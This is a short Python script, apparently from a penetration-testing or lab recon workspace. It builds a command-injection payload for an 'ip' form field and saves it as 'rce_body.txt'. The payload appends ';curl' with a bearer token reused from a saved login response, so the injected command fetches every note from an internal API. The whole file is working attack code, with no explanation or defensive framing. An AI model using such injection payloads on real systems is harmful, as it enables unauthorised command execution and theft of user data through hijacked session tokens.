import json
from pathlib import Path
from urllib.parse import urlencode
login = json.load(open('/workspace/recon/httpx/login_resp.json'))
tok = login['token']
val = f"1;curl -s -H 'Authorization: Bearer {tok}' http://127.0.0.1:41412/api/notes/all"
body = urlencode({'ip': val})
Path('/workspace/recon/tmp').mkdir(parents=True, exist_ok=True)
Path('/workspace/recon/tmp/rce_body.txt').write_text(body)
print(body)
